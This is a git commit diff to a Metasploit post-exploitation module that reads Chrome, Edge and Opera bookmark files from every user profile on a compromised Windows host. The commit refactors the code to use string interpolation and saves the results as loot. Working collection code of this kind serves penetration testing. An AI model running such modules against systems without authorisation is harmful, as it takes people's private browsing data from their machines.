aa7cba7b7259b465090f5642356caf8ea1b8c9ec
jerrelgordon <73038486+jerrelgordon@users.noreply.github.com>
2022-04-05 16:50:51 -0400

    included store_loot and string interpolation

--- modules/post/windows/gather/get_bookmarks.rb
+++ modules/post/windows/gather/get_bookmarks.rb
@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'jerrelgordon'],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'SessionTypes' => ['meterpreter'],
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [REPEATABLE_SESSION],
@@ -29,48 +29,40 @@ class MetasploitModule < Msf::Post
   end
 
   def get_bookmarks(browser)
-    print_status('Bookmarks on: ' + browser)
     fileexists = false # initializes file as not found
     grab_user_profiles.each do |user| # parses information for all users on target machine into a list.
       # If the browser is Google Chrome or Edge is searches the "AppData\Local directory, if it is Opera, it searches the AppData\Roaming directory"
       if (browser == 'GoogleChrome')
         next unless user['LocalAppData']
 
-        bookmark_path = user['LocalAppData'] + '\\Google\\Chrome\\User Data\\Default\\Bookmarks' # sets path for Google Chrome Bookmarks
-        print_status('Google Chrome Google Chrome Google Chrome')
-        print_status('Google Chrome Google Chrome Google Chrome')
-        print_status('Google Chrome Google Chrome Google Chrome')
-        print_status('Google Chrome Google Chrome Google Chrome')
+        bookmark_path = "#{user['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Bookmarks" # sets path for Google Chrome Bookmarks
       elsif (browser == 'Edge')
         next unless user['LocalAppData']
 
-        bookmark_path = user['LocalAppData'] + '\\Microsoft\\Edge\\User Data\\Default\\Bookmarks' # sets path for Microsoft Edge Bookmarks
-        print_status('Edge Edge Edge')
-        print_status('Edge Edge Edge')
-        print_status('Edge Edge Edge')
-        print_status('Edge Edge Edge')
+        bookmark_path = "#{user['LocalAppData']}\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" # sets path for Microsoft Edge Bookmarks
       elsif (browser == 'Opera')
         next unless user['AppData']
 
-        bookmark_path = user['AppData'] + '\\Opera Software\\Opera Stable\\Bookmarks' # sets path for Opera Bookmarks
-        print_status('Opera Opera Opera')
-        print_status('Opera Opera Opera')
-        print_status('Opera Opera Opera')
-        print_status('Opera Opera Opera')
+        bookmark_path = "#{user['AppData']}\\Opera Software\\Opera Stable\\Bookmarks" # sets path for Opera Bookmarks
       end
       next unless file?(bookmark_path) # if file exists it is set to found, then all the bookmarks are outputted to standard output (the shell)
 
       fileexists = true
-      print_status('BOOKMARKS FOR' + user['ProfileDir'])
-      # puts "BOOKMARKS FOR " + user['ProfileDir']
-      # puts "\n"
+      print_status("BOOKMARKS FOR #{user['ProfileDir']}")
       file = read_file(bookmark_path)
-      # puts file
-      print_good(file)
+      stored_bookmarks = store_loot(
+        "#{browser}.bookmarks",
+        'text/plain',
+        session,
+        file,
+        "#{session}_#{browser}_bookmarks.txt",
+        "Bookmarks for #{browser}"
+      )
+      print_status("Bookmarks stored: #{stored_bookmarks}")
+      # print_good(file)
     end
     if (fileexists == false) # if file was not found, prints no file found.
-      # puts "No Bookmarks found for " + browser
-      print_status('No Bookmarks found for' + browser)
+      print_status("No Bookmarks found for #{browser}")
     end
   end
 end
